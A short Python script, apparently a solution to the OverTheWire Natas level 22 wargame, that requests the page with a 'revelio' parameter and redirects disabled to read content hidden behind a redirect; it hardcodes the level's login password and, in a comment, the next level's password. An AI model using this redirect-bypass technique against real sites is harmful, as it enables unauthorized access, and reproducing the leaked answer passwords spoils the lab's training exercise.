import requests

url = 'http://natas22.natas.labs.overthewire.org/'
username = 'natas22'
password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
payload = {"revelio" : "djdjd"}
session = requests.session()

response = session.get(
    url, params=payload, auth=(username, password), allow_redirects = False)

print(response.text)
#print(response.history)

# natas23_pass: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE